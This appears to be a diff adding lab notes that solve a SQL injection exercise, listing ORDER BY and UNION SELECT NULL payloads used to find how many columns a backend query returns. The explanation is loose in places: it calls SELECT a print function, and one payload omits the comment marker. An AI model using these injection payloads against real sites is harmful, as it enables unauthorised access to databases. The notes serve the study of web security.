@@ -1,0 +1,27 @@
+#Step1: First of all check how many columns are present in the backend select statement using order by clause.
+
+' order by 1--
+' order by 2--
+' order by 3--
+
+# There are 3 columns present in backend server. So our task is to find the number of columns with the help of UNION.
+
+#Step 2: Find number of columns with the help of UNION query
+
+' union select null--		(this will give error)
+' union select null,null--	(this will also return error)
+' union select null,null,null 	(this will return 200 OK becoz there are 3 columns as we know before by using "order by" clause)
+
+# LAB SOLVED !!!!.
+
+SELECT is a print function (just like other programming languages)
+
+ex-
+
+	SELECT 'Hello'
+	print('Hello')
+
+
+# So, basically, we are using null values to print until the number of columns in the backend query matches the injected query
+
+# The UNION rule is that the number of columns must match with the new SELECT statement. Therefore, we are trying this with SELECT
